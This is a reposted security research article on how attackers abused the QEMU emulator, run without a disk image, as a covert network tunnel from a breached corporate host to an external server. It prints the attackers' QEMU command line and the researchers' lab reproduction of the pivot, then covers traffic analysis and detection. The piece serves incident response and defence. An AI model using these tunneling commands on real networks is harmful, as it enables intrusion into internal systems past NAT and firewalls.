<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://securelist.com/network-tunneling-with-qemu/111803/">Original</a>
    <h1>Network Tunneling with QEMU</h1>
    
    <div id="readability-page-1" class="page"><div>
	
			<section>
				<div>
					<article>
						<header>
							<figure>
								<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-800x450.jpg" alt="" decoding="async" fetchpriority="high" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-300x169.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-1024x576.jpg 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-768x432.jpg 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-622x350.jpg 622w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-740x416.jpg 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-498x280.jpg 498w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1.jpg 1200w"/>							</figure>
														<p>
								<a href="https://securelist.com/category/research/">Research</a>
							</p>
																					<div>
																<p>
									<a href="https://securelist.com/category/research/">Research</a>
								</p>
																<p><time datetime="2024-03-05T08:00:14+00:00">05 Mar 2024</time></p>
								<p>
									<svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-hourglass"></use></svg> <span></span> minute read								</p>
							</div>
						</header>

						<div>

							<div>

																
								
								<div>
									<div>
										<div>
											<figure>
												<img width="1200" height="600" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-1200x600.jpg" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/02/04101542/sl-anstract-nodes-tunnel-1200-1-1200x600.jpg" data-srcset="" srcset=""/>											</figure>

											

											
											<div>
												<div>
													<p>Cyberattackers tend to give preference to legitimate tools when taking various attack steps, as these help them evade detection systems while keeping malware development costs down to a minimum. Network scanning, capturing a process memory dump, exfiltrating data, running files remotely, and even encrypting drives — all these can be done with trusted software. To gain a foothold inside a compromised infrastructure and develop the attack, adversaries can use previously installed malware or connect to the network along with employees through the company’s RDP servers or corporate VPN (to do this, attackers must have accounts with appropriate privileges). Another way to connect to the internal network of an attacked organization involves using utilities to set up network tunnels or forward network ports between corporate systems and the adversary’s servers, which allows the attackers to bypass NAT and firewalls to gain access to internal systems. It is that category of software that we would like to discuss here.</p>
<h2 id="statistics">Statistics</h2>
<p>There is currently no shortage of utilities that can be used to set up a network tunnel between two systems. Some of these connect directly, while others use a proxy, which hides the IP address of the attackers’ server. The following are the utilities we have come across while responding to cyberincidents in the last three years.</p>
<ul>
<li>Stowaway</li>
<li>ligolo</li>
<li>3proxy</li>
<li>dog-tunnel</li>
<li>chisel</li>
<li>FRP</li>
<li>ngrok</li>
<li>gs-netcat</li>
<li>plink</li>
<li>iox</li>
<li>nps</li>
</ul>
<p>The most frequently used ones were ngrok and FRP. Utilities of this type accounted for 10% of total attacks.</p>

<p>While investigating an incident at a large company a few months ago, we detected uncommon malicious activity inside one of the systems. We ran an analysis on the artifacts, only to find that the adversary had deployed and launched the following:</p>
<ul>
<li>The Angry IP Scanner network scanning utility</li>
<li>The mimikatz password, hash, and Kerberos ticket extractor, and Active Directory attack tool</li>
<li>The QEMU hardware emulator</li>
</ul>
<p>The first two were self-explanatory, but QEMU raised a few questions. What use would the malicious actors have for a virtualizer?</p>
<p>We were able to retrieve the QEMU execution command line from the memory of the compromised machine. We found that it was started without a LiveCD or disk image, which is very unusual for QEMU. These were the arguments that the adversary used to run QEMU:</p>
		<div id="crayon-65e8229cd5fb2556584465" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>i386</span><span>.</span><span>exe</span><span> </span>-<span>m</span><span> </span><span>1M</span><span> </span>-<span>netdev </span><span>user</span><span>,</span><span>id</span>=<span>lan</span><span>,</span><span>restrict</span>=<span>off</span><span> </span>-<span>netdev </span></p><p><span>socket</span><span>,</span><span>id</span>=<span>sock</span><span>,</span><span>connect</span>=<span>&lt;</span><span>IP</span><span>&gt;</span><span>:</span><span>443</span><span> </span>-<span>netdev </span><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-<span>lan</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>lan</span><span> </span>-<span>netdev </span></p><p><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-<span>sock</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>sock</span><span> </span>-<span>nographic</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
where &lt;IP&gt; was an external IP address.</p>
<p>Let us take a closer look at these arguments.</p>
<ul>
<li><strong>-m 1M</strong>: Specifies the RAM size to allocate to the virtual machine. This was 1 MB in this case, utterly insufficient for most operating systems.</li>
<li><strong>-netdev user,id=lan,restrict=off</strong>: Creates a virtual network interface with the name lan and type user, which allows the virtual machine to communicate with the outside world through the host network stack. The restrict=off option removes restrictions on inbound and outbound connections.</li>
<li><strong>-netdev socket,id=sock,connect=&lt;IP&gt;:443</strong>: Creates a socket-type network interface with the name sock, which provides a connection to a remote server at the specified IP address and port 443.</li>
<li><strong>-netdev hubport,id=port-lan,hubid=0,netdev=lan</strong>: Adds a port to the virtual hub with hubid=0, which is linked to the virtual network interface lan.</li>
<li><strong>-netdev hubport,id=port-sock,hubid=0,netdev=sock</strong>: Similarly to the above, this adds one more port to the virtual hub linked to the virtual network interface sock.</li>
<li><strong>-nographic</strong>: starts QEMU in non-GUI mode with console output.</li>
</ul>
<p>The IP address in the arguments grabbed our attention immediately: it was external and completely unrelated to the attacked company, so we consulted the QEMU documentation. We found that QEMU supported connections between virtual machines: the -netdev option creates network devices (backend) that can then connect to the virtual machines. Each of the numerous network devices is defined by its type and supports extra options. Below is a description of the -netdev values that were used.</p>
<h3 id="user-user-network-stack">user (user network stack)</h3>
<p>This is the simplest way of connecting a virtual machine to a network. Traffic passes through the host network stack, and the virtual machine connects to the network as if it were a regular app on the host machine.</p>
		<div id="crayon-65e8229cd5fb7917383371" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>netdev </span><span>user</span><span>,</span><span>id</span>=<span>mynet0</span><span> </span>-<span>device </span><span>e1000</span><span>,</span><span>netdev</span>=<span>mynet0</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
Here, mynet0 is the network backend ID, and e1000 is a network adapter (frontend) inside the virtual machine.</p>
<h3 id="hubport-virtual-hub">hubport (virtual hub)</h3>
<p>Connects several network devices similarly to a network hub.</p>
<h3 id="socket">socket</h3>
<p>This connects virtual machines directly through network sockets to create VM network topologies or link VMs spun up on different hosts.</p>
<p># VM1</p>
		<div id="crayon-65e8229cd5fb9785775712" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>netdev </span><span>socket</span><span>,</span><span>id</span>=<span>mynet3</span><span>,</span><span>listen</span>=<span>:</span><span>1234</span><span> </span>-<span>device </span><span>e1000</span><span>,</span><span>netdev</span>=<span>mynet3</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
# VM2, connected to VM1</p>
		<div id="crayon-65e8229cd5fba702914362" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>netdev </span><span>socket</span><span>,</span><span>id</span>=<span>mynet4</span><span>,</span><span>connect</span>=<span>127.0.0.1</span><span>:</span><span>1234</span><span> </span>-<span>device </span></p><p><span>e1000</span><span>,</span><span>netdev</span>=<span>mynet4</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
VM1 listens on port 1234, while VM2 connects to that port. This was the route the attackers took: they launched a “client” in the compromised system and had it connect to their server to open access to the corporate network where the “client” was running. It had next to no effect on the performance of the compromised system, as the adversary was using neither a disk image nor a LiveCD when running QEMU.</p>
<p>We had no way of reliably determining how the attackers ran QEMU on their own server, so we decided to test the technique described above on a bed consisting of three systems:</p>
<ul>
<li>InternalHost was located inside the network, with no internet access and running an RDP server on port 3389. It simulated the isolated system without access to the internet.</li>
<li>PivotHost was located inside the network, but it had internet access. It simulated the system that had been breached by the attackers and used for reaching InternalHost.</li>
<li>AttackerServer was hosted in the cloud, and it simulated the adversary’s server.</li>
</ul>
<p>Our aim was to reach InternalHost from AttackerServer. The image below shows the general layout of the tunnel.</p>
<div id="attachment_111806"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111806" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-970x1024.png" alt="Network tunnel diagram" width="970" height="1024" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-970x1024.png 970w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-284x300.png 284w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-768x811.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-1455x1536.png 1455w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-332x350.png 332w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-740x781.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-265x280.png 265w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-800x844.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01.png 1618w" sizes="(max-width: 970px) 100vw, 970px"/></a></p><p id="caption-attachment-111806">Network tunnel diagram</p></div>
<p>We used QEMU on AttackerServer to spin up a VM from a Kali Linux LiveCD. A socket-type network device connected to the VM as a network adapter and listened on port 443.</p>
		<div id="crayon-65e8229cd5fbb705518986" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>boot</span><span> </span><span>d</span><span> </span>-<span>cdrom </span><span>kali</span>-<span>linux</span>-<span>2023.3</span>-<span>live</span>-<span>amd64</span><span>.</span><span>iso</span><span> </span>-<span>m</span><span> </span><span>6048</span><span> </span>-<span>device </span></p><p><span>e1000</span><span>,</span><span>netdev</span>=<span>n1</span><span>,</span><span>mac</span>=<span>52</span><span>:</span><span>54</span><span>:</span><span>00</span><span>:</span><span>12</span><span>:</span><span>34</span><span>:</span><span>56</span><span> </span>-<span>smp</span><span> </span><span>2</span><span> </span>-<span>netdev </span><span>socket</span><span>,</span><span>id</span>=<span>n1</span><span>,</span><span>listen</span>=<span>:</span><span>443</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
Another copy of QEMU was running on PivotHost and connecting through the socket network device to port 443 on AttackerServer in the cloud. We also connected a user-type network device, combined with socket through a hub. The QEMU startup options we used were similar to those previously used by the adversary.</p>
		<div id="crayon-65e8229cd5fbc860855617" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>i386</span><span>.</span><span>exe</span><span> </span>-<span>m</span><span> </span><span>1M</span><span> </span>-<span>netdev </span><span>user</span><span>,</span><span>id</span>=<span>lan</span><span>,</span><span>restrict</span>=<span>off</span><span> </span>-<span>netdev </span></p><p><span>socket</span><span>,</span><span>id</span>=<span>sock</span><span>,</span><span>connect</span>=<span>&lt;</span><span>AttackerServer</span><span>&gt;</span><span>:</span><span>443</span><span> </span>-<span>netdev </span><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-</p><p><span>lan</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>lan</span><span> </span>-<span>netdev </span><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-<span>sock</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>sock</span><span> </span>-<span>nographic</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
Once started, QEMU set up a network tunnel from PivotHost to AttackerServer, or more precisely, to the Kali Linux VM. Kali Linux could scan the subnet to which PivotHost was connected for other systems.</p>
<div id="attachment_111807"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111807" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02.png" alt="Subnet scan output" width="739" height="483" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02.png 739w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02-300x196.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02-536x350.png 536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02-428x280.png 428w" sizes="(max-width: 739px) 100vw, 739px"/></a></p><p id="caption-attachment-111807">Subnet scan output</p></div>
<p>The scan located InternalHost, with the IP address 192.168.56.109. The Nmap utility showed that port 3389 was open. We tried connecting to InternalHost using RDP.</p>
<div id="attachment_111808"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111808" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-1024x593.png" alt="Successful RDP connection to InternalHost" width="1024" height="593" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-1024x593.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-300x174.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-768x445.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-604x350.png 604w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-740x428.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-484x280.png 484w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-800x463.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03.png 1038w" sizes="(max-width: 1024px) 100vw, 1024px"/></a></p><p id="caption-attachment-111808">Successful RDP connection to InternalHost</p></div>
<p>Thus, we were able to ascertain that this technique for achieving network access was indeed effective. In addition to the aforementioned types of network devices, QEMU supports several others, which can also be employed by malicious actors.</p>
<h2 id="qemu-network-traffic-analysis">QEMU network traffic analysis</h2>
<p>QEMU does not use any extra encryption when tunneling traffic. It transmits encapsulated packets unencrypted: the application-level packet data sent to the server contains the size of the encapsulated Ethernet frame (4 bytes, outlined in yellow in the image below), followed by the Ethernet frame itself (outlined in red).</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-1024x131.png" alt="Example of an encapsulated Ethernet frame" width="1024" height="131" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-1024x131.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-300x38.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-768x98.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-740x94.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-800x102.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04.png 1222w" sizes="(max-width: 1024px) 100vw, 1024px"/></a></p>
<div id="attachment_111810"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111810" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05.png" alt="Example of an encapsulated Ethernet frame" width="910" height="277" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05.png 910w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-300x91.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-768x234.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-740x225.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-800x244.png 800w" sizes="(max-width: 910px) 100vw, 910px"/></a></p><p id="caption-attachment-111810">Example of an encapsulated Ethernet frame</p></div>
<p>The size of the encapsulated Ethernet frame in the image above is 89 (0x59) bytes. That value is immediately followed by the encapsulated Ethernet frame.</p>
<p>Having a traffic dump, which had been intercepted on PivotHost in that case, we could obtain the encapsulated traffic by removing the first 58 bytes (for TCP: 14 bytes for Ethernet + 20 bytes for IP + 20 bytes for TCP headers + 4 for internal packet size). This could be done with the editcap utility from the Wireshark package after removing all packets that contained no encapsulated traffic from the PCAP file.</p>
		<div id="crayon-65e8229cd5fbd264815333" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>editcap</span><span>.</span><span>exe</span><span> </span>-<span>L</span><span> </span>-<span>C</span><span> </span><span>58</span><span> </span><span>original</span><span>.</span><span>pcap </span><span>extracted_traffic</span><span>.</span><span>pcap</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p>
The result was a PCAP file containing the traffic that had been sent through the tunnel.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06.png" alt="Original packet transmitted through the tunnel" width="926" height="400" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06.png 926w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-300x130.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-768x332.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-810x350.png 810w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-740x320.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-648x280.png 648w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-800x346.png 800w" sizes="(max-width: 926px) 100vw, 926px"/></a></p>
<div id="attachment_111812"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111812" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07.png" alt="Original packet transmitted through the tunnel" width="675" height="124" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07.png 675w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07-300x55.png 300w" sizes="(max-width: 675px) 100vw, 675px"/></a></p><p id="caption-attachment-111812">Original packet transmitted through the tunnel</p></div>
<h2 id="conclusion">Conclusion</h2>
<p>Malicious actors using legitimate tools to perform various attack steps is nothing new to incident response professionals. Yet we have to admit that attackers sometimes come up with ingenious applications for unlikely software, as was the case with QEMU. This further supports the concept of multi-level protection, which covers both reliable endpoint protection, and specialized solutions for detecting and protecting against complex and targeted attacks including human-operated ones. Only comprehensive security that includes 24/7 network (NDR, NGFW) and endpoint (EDR, EPP) monitoring, by SOC experts for one, can detect anomalies in a timely manner and block an attack in its initial stage. Our MDR service is already capable of detecting the kind of suspicious QEMU activity in question, and appropriate IDS rules have been added to the KATA platform with the verdict <strong>Backdoor.Agent.QEMU.C&amp;C</strong>.</p>
												</div>
											</div>
										</div>

										
				<!-- .entry-comments -->
											</div>
									<div>
																				
																					
													
					
					
		<li id="text-22">			<p><a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_kas-ti_acq_ona_smm__onl_b2b_securelist_ban_sm-team______&amp;utm_source=SecureList&amp;utm_medium=sm-project&amp;utm_campaign=gl_kas-ti_le0222&amp;utm_content=banner&amp;utm_term=gl_SecureList_organic_m222khhdtozqgjr" target="_blank" rel="noopener"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/29092442/Threat-Intelligence_banner_310x420_EN.jpg" width="370"/></a></p>
		</li>
									</div>
								</div>

							</div>
						</div>

						
					</article>
				</div>
			</section>
			<section>
	
</section>
	<section data-element-id="latest-webinars-post-section">
		
	</section>
		<section data-element-id="footer-reports-section">
		<div>
			<h5>Reports</h5>
			<div>
				<div>
					<div>
																							<div>
												<article>
		<div>
		
				<p>In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.</p>
					</div>
</article>
						</div>
															</div>
				</div>
								
							</div>
		</div>
	</section>
		<section data-element-id="footer-subscribe-section">
		
	</section>
	</div></div>
  </body>
</html>
